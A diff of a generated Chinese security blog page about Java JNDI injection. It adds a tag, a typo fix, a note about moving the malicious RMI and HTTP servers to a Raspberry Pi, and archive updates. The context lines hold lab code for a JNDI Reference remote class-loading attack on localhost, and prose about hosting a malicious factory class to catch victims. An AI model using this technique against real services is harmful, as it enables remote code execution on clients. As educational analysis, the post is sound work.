@@ -265,11 +265,13 @@ height:50vh;
     
         <a class="post-tag" href="javascript:void(0);" data-tags = "Java">Java</a>
     
+        <a class="post-tag" href="javascript:void(0);" data-tags = "漏洞分析">漏洞分析</a>
+    
 </div>
                 
                 
                     <div class="post-intro-read">
-                        <span>Word count: <span class="post-count">4,400</span> / Reading time: <span class="post-count">20 min</span></span>
+                        <span>Word count: <span class="post-count">4,553</span> / Reading time: <span class="post-count">20 min</span></span>
                     </div>
                 
                 <div class="post-intro-meta">
@@ -440,7 +442,7 @@ height:50vh;
 </ul>
 <p>​    那我们通过另一个实例代码来展示这个攻击手段，<a href="http://sunsec.top/2019/10/16/JavaSpring反序列化" target="_blank" rel="noopener">代码参考来源</a>，下面是我的包结构：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">reference</span><br><span class="line">    ├─jndi</span><br><span class="line">    │      RMIClient2.java</span><br><span class="line">    │      RMIServer2.java</span><br><span class="line">    │</span><br><span class="line">    └─remoteClass</span><br><span class="line">           ExportObject.java</span><br><span class="line">           MyHttpServer.java</span><br></pre></td></tr></table></figure>
-<p>​    首先是客户端，因为JDK8u113后限制了Naming/Directory服务中JNDI Reference元册灰姑娘加载Object Factory的特性，所以要将<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性设置为true，后面会讨论怎么实现高版本JDK的JNDI注入。</p>
+<p>​    首先是客户端，因为JDK8u113后限制了Naming/Directory服务中JNDI Reference远程加载Object Factory的特性，所以要将<code>com.sun.jndi.rmi.object.trustURLCodebase</code>属性设置为true，后面会讨论怎么实现高版本JDK的JNDI注入。</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reference.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.Context;</span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">"com.sun.jndi.rmi.object.trustURLCodebase"</span>, <span class="string">"true"</span>);<span class="comment">//注意这里</span></span><br><span class="line">        Context ctx = <span class="keyword">new</span> InitialContext();</span><br><span class="line">        ctx.lookup(<span class="string">"rmi://localhost:9999/refObj"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>​    服务端声明了一个引用类，他的类名称为ExportObject，位置在同一个父包下的另一个子包中，工厂类地址为本地的8000端口：</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> reference.jndi;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIServer2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException </span>&#123;</span><br><span class="line">        Registry registry = LocateRegistry.createRegistry(<span class="number">9999</span>);</span><br><span class="line">        System.out.println(<span class="string">"RMI Registry Created, Listening on port 9999......"</span>);</span><br><span class="line">        Reference refObj = <span class="keyword">new</span> Reference(<span class="string">"ExportObject"</span>, <span class="string">"reference.remoteClass.ExportObject"</span>, <span class="string">"http://127.0.0.1:8000/"</span>);</span><br><span class="line">        ReferenceWrapper refObjWrapper = <span class="keyword">new</span> ReferenceWrapper(refObj);</span><br><span class="line">        registry.bind(<span class="string">"refObj"</span>, refObjWrapper);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
@@ -453,6 +455,11 @@ height:50vh;
 <p>​    这里注意一个细节，加入我们在ExportObject中增加一条输出：</p>
 <p><img src="/img/Java 反序列化漏洞与JNDI注入-下/image-20200424000430798.png" alt="image-20200424000430798"></p>
 <p>​    可以看到作为客户端的我们收到了这条消息，但是按照RMI的思路，这个类不应该在远程执行吗？为什么输出到客户端了？这也是Reference这个类的作用，服务端只是给予了客户端一个引用，具体的类要客户端去远程请求。</p>
+<h4 id="补充-2020-6-18"><a href="#补充-2020-6-18" class="headerlink" title="补充 2020.6.18"></a>补充 2020.6.18</h4><p>​    上面的例子可以说明一些问题但是后来我觉得不够清晰，这里再复习一下，上述实验中因为服务器和客户端都运行在本地所以计算器的弹出你可能不知道是服务端那边还是客户端那边。</p>
+<p>​    因为我加的输出可以看到是在客户端这边输出的，所以实际上这个计算器是客户端的，为了证明这一点，我将服务程序、Http服务器放在我的树莓派上：</p>
+<p><img src="/img/Java 反序列化漏洞与JNDI注入-下/image-20200608113725053.png" alt="image-20200608113725053"></p>
+<p>​    之后本地运行可以看到结果</p>
+<p><img src="/img/Java 反序列化漏洞与JNDI注入-下/image-20200608113752245.png" alt="image-20200608113752245"></p>
 <h3 id="JNDI注入流程详解"><a href="#JNDI注入流程详解" class="headerlink" title="JNDI注入流程详解"></a>JNDI注入流程详解</h3><p>​    通过上面的两个方法：覆写客户端的lookup参数、填写恶意的ClassName和路径，但是实际中不可能存在憨憨开发人员这么写，那么怎么利用这两种现象呢？</p>
 <p>​    恶意工厂类肯定是自己写没问题了，那我们就采用类似反弹shell的方式，自己在自己的服务器上部署这个恶意类，并注册服务到RMI注册表，打开监听端口等人上门。所以重点就是控制客户端的lookup参数了。具体流程如下图：</p>
 <p><img src="/img/Java 反序列化漏洞与JNDI注入-下/2873.png" alt=""></p>
@@ -651,7 +658,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#温习"><span class="toc-number">1.</span> <span class="toc-text">温习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDNI及注入原理-下"><span class="toc-number">2.</span> <span class="toc-text">JDNI及注入原理(下)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖客户端地址"><span class="toc-number">2.1.</span> <span class="toc-text">覆盖客户端地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与RMI反序列化漏洞的区别"><span class="toc-number">2.2.</span> <span class="toc-text">与RMI反序列化漏洞的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用Reference类实现JNDI注入"><span class="toc-number">2.3.</span> <span class="toc-text">使用Reference类实现JNDI注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI注入流程详解"><span class="toc-number">2.4.</span> <span class="toc-text">JNDI注入流程详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结合LDAP的JNDI注入"><span class="toc-number">2.5.</span> <span class="toc-text">结合LDAP的JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP"><span class="toc-number">2.5.1.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-JNDI注入实例"><span class="toc-number">2.5.2.</span> <span class="toc-text">LDAP + JNDI注入实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#局限性"><span class="toc-number">2.6.</span> <span class="toc-text">局限性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#温习"><span class="toc-number">1.</span> <span class="toc-text">温习</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JDNI及注入原理-下"><span class="toc-number">2.</span> <span class="toc-text">JDNI及注入原理(下)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#覆盖客户端地址"><span class="toc-number">2.1.</span> <span class="toc-text">覆盖客户端地址</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#与RMI反序列化漏洞的区别"><span class="toc-number">2.2.</span> <span class="toc-text">与RMI反序列化漏洞的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#使用Reference类实现JNDI注入"><span class="toc-number">2.3.</span> <span class="toc-text">使用Reference类实现JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#补充-2020-6-18"><span class="toc-number">2.3.1.</span> <span class="toc-text">补充 2020.6.18</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JNDI注入流程详解"><span class="toc-number">2.4.</span> <span class="toc-text">JNDI注入流程详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#结合LDAP的JNDI注入"><span class="toc-number">2.5.</span> <span class="toc-text">结合LDAP的JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP"><span class="toc-number">2.5.1.</span> <span class="toc-text">LDAP</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#LDAP-JNDI注入实例"><span class="toc-number">2.5.2.</span> <span class="toc-text">LDAP + JNDI注入实例</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#局限性"><span class="toc-number">2.6.</span> <span class="toc-text">局限性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1577,9 +1584,77 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 63
+        Total : 67
         </div>
         <!-- search  -->
         
@@ -1592,6 +1667,26 @@ top:50vh;
     
     <div class="archive-year"> 2020 </div>
     <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/ElasticSearch学习(一)/" >ElasticSearch学习(一)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/17</span><a class="archive-post-title" href= "/DC-1靶机渗透/" >DC-1靶机渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/03</span><a class="archive-post-title" href= "/Spring-tx反序列化漏洞/" >Spring-tx反序列化漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/31</span><a class="archive-post-title" href= "/fastjson反序列化漏洞学习/" >fastjson反序列化漏洞学习</a>
+        </li>
     
     
         <li class="archive-post-item">
@@ -1933,7 +2028,7 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="渗透测试"><span class="iconfont-archer">&#xe606;</span>渗透测试</span>
     
-        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+        <span class="sidebar-tag-name" data-tags="Java - 漏洞分析"><span class="iconfont-archer">&#xe606;</span>Java - 漏洞分析</span>
     
         <span class="sidebar-tag-name" data-tags="Javascript"><span class="iconfont-archer">&#xe606;</span>Javascript</span>
     
@@ -1953,6 +2048,10 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="DOM"><span class="iconfont-archer">&#xe606;</span>DOM</span>
     
+        <span class="sidebar-tag-name" data-tags="Java"><span class="iconfont-archer">&#xe606;</span>Java</span>
+    
+        <span class="sidebar-tag-name" data-tags="漏洞分析"><span class="iconfont-archer">&#xe606;</span>漏洞分析</span>
+    
         <span class="sidebar-tag-name" data-tags="JavaEE"><span class="iconfont-archer">&#xe606;</span>JavaEE</span>
     
         <span class="sidebar-tag-name" data-tags="Spring"><span class="iconfont-archer">&#xe606;</span>Spring</span>
@@ -1964,8 +2063,6 @@ top:50vh;
         <span class="sidebar-tag-name" data-tags="信息收集"><span class="iconfont-archer">&#xe606;</span>信息收集</span>
     
         <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
-    
-        <span class="sidebar-tag-name" data-tags="漏洞挖掘"><span class="iconfont-archer">&#xe606;</span>漏洞挖掘</span>
     
         <span class="sidebar-tag-name" data-tags="电子取证"><span class="iconfont-archer">&#xe606;</span>电子取证</span>
     
